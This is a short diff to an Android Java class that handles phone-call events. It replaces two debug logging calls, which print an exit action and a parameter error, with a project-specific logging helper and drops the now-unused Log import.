@@ -11,12 +11,11 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.Call;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
@@ -57,9 +56,9 @@ public class EventCall extends EventBase implements Observer<Call> {
 				number = WChar.getString(num, true);
 				
 				num = null;
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " exitAction: " + actionOnExit + " number: \"");
+				if(Cfg.DEBUG) Check.log( TAG + " exitAction: " + actionOnExit + " number: \"");
 			} catch (final IOException e) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
+				if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
 				return false;
 			}
 			
